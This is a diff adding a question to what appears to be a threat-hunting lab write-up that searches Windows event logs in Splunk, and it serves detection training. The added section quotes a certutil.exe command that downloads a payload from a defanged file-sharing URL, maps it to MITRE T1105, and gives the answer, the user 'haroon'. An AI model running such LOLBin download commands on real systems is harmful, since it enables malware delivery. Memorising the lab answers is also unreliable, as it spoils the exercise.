@@ -88,3 +88,18 @@ index=win_eventlogs| rare limit=20 UserName
 Filtering on this specific command, the user who launched the task was Chris, who is identified as a user of the HR Department.
 
 *Answer:* Chris 
+
+***Question 4: Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?***
+
+*Investigative Workflow & Thought Process:* We keep are search narrowed to only users in the HR Department and all unique Command line events. Straight away, one entry stands out *certutil.exe -urlcache -f - hxxps://controlc[.]com/e4d11035 benign.exe*. That command is highly suspicious and is commonly associated with using certutil.exe as a LOLBin (Living off the Land Binary) to download content. Attackers often used LOLBins such as Wget, Certutil, Rundll32, etc to retrieve malicous files and tools.
+
+**MITRE ATT&CK mapping**
+This behavior maps to:
+- T1105 — Ingress Tool Transfer
+
+The broader technique is downloading a file from an external location onto the compromised system. certutil.exe is also commonly monitored as a Windows LOLBin because legitimate administrative utilities can be abused for this purpose.
+
+We include this command in our search query and view the results. The user who launches the command is haroon.
+
+
+*Anwser:* haroon
